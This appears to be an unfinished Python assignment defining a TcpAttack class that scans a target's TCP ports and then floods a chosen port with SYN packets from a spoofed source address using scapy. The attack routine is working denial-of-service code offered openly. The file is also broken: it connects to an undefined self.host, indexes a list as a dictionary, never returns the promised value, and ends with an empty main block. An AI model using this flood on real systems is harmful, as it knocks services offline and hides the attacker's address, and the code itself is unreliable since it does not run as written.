import sys, socket
import re
import os.path
from scapy.all import *
class TcpAttack():
    def __init__(self, spoofIP:str, targetIP:str):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        #Note: The IP addresses can be expressed as symbolic hostnames or in dot-decimal notation.

    def scanTarget(self, rangeStart:int, rangeEnd:int):
        print(f"Scanning {self.targetIP} from {rangeStart} to {rangeEnd}")
        # rangeStart: the first port in the range of ports to be scanned
        # rangeEnd: the last port in the range of ports to be scanned
        
        #Writes all open ports detected into an output file called "openports.txt"
        verbosity = 0 # Set to 1 if want to see the result for each port seperately
        openports = []
        for port in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.host, port)) # problem
                openports.append(port)
                if verbosity: print(port)
                sys.stdout.write(".")
                sys.stdout.flush()
            except:
                if verbosity: print(f"Port {port} is closed")
                sys.stdout.write(".")
                sys.stdout.flush()
        service_ports = []
        if os.path.exists("/etc/services"):
            IN = open("/etc/services")
            for line in IN:
                line = line.strip()
                if line == '': continue
                if (re.match(r'^\s*#', line)): continue
                entries = re.split(r'\s+', line)
                service_ports[entries[1]] = ' '.join(re.split(r'\s+', line))
            IN.close()
        OUT = open("openports.txt", "w")
        if not openports:
            print("No open ports detected")
        else:
            print("\n\nThe open ports:\n\n")
            for i in range(len(openports)):
                if len(service_ports) > 0:
                    for portname in sorted(service_ports):
                        pattern = r'^' + str(openports[i]) + r'/'
                        if re.search(pattern, str(portname)):
                            print(f"{openports[i]}: {service_ports[portname]}")
                else:
                    print(openports[i])
                OUT.write(str(openports[i]) + "\n")
        OUT.close()
        
    def attackTarget(self, port:int, numSyn:int) -> int:
        # port: integer designating the port that the attack will use

        # numSyn: integer of SYN packets to send to target IP address at the given port

        # If the port is open, perform a DoS attack and return 1. Otherwise return 0.
        print(f"Attacking {self.targetIP} at port {port} with {numSyn} SYN packets")
        for i in range(numSyn):
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)

if __name__ == "__main__":
    # Construct an instance of the TcpAttack class and perform a scan and attack
